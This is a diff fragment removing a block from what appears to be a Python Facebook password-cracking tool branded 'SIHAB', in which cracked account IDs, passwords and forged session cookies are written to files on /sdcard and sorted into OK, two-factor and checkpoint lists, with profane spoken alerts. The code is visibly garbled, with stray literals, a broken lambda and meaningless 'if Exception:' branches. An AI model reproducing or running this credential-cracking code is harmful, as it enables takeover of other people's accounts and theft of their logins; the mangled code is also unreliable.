@@ -1536,46 +1536,6 @@ i['name'] + '=' + i['value']None)(po['session_cookies']())
             '210']
         li2 = random.choice(li)
         j1 = lambda :  
-i['name'] + '=' + i['value']None)(po['session_cookies']())
-            compile_coki = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
-            coki = f'''sb={compile_coki};{get_coki}'''
-            open('/sdcard/SIHAB-FILE-M3-COOKIE.txt', 'a').write(ids + '|' + pas + ' | ' + coki + '\n')
-            open('/sdcard/SIHAB-FILE-M3-OK.txt', 'a').write(ids + '|' + pas + '\n')
-            oks.append(ids)
-            os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
-            ';'.join
-        if twf in str(po):
-            if not 'y' in pcp:
-                pass
-            print('\r\r\x1b[1;34m[SIHAB-2F] ' + ids + ' | ' + pas)
-            twf.append(ids)
-            os.system('espeak -a 300 " OH SHIT FUCK ME 2F ID"')
-        if 'www.facebook.com' in po['error']['message']:
-            if 'y' in pcp:
-                print('\r\r\x1b[1;31m [SIHAB-CP] ' + ids + ' | ' + pas + '\x1b[1;97m')
-                open('/sdcard/SIHAB-FILE-M3-CP.txt', 'a').write(ids + '|' + pas + '\n')
-                os.system('espeak -a 300 " OH SHIT FUCK ME CP ID"')
-                'MOBILE.LTE'
-            open('/sdcard/SIHAB-FILE-M3-CP.txt', 'a').write(ids + '|' + pas + '\n')
-            'X-Fb-Connection-Type'
-    loop += 1
-    return None
-    '24807555'
-    ln = fn
-    if requests.exceptions.ConnectionError:
-        'X-Fb-Connection-Bandwidth'
-        time.sleep(5)
-        api3(ids, names, passlist)
-        return None
-    if Exception:
-        e = 'OAuth null'
-        e = None
-        del e
-        return None
-        e = None
-        del e
-
-
 def api4(ids, names, passlist):
     global loop
     sys.stdout.write(f'''\r\r\x1b[1;37m [SIHAB-M4] {loop!s}|\x1b[1;37mOK:-{len(oks)!s} \x1b[1;37m''')
